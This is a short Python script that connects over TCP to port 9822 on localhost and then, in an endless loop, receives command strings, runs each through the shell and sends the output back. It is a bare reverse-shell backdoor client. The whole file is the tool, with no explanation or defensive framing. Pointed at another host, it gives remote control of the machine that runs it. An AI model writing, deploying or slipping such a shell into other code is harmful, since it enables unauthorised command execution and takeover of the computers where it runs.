import socket
import subprocess as sp
import time

credentials=('localhost', 9822)
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(credentials)
print("Connected!")

while True:
    cmd=sock.recv(4096).decode('utf-8')
    result=sp.run(cmd, capture_output=True, shell=True, text=True)
    sock.send(result.stdout.encode('utf-8'))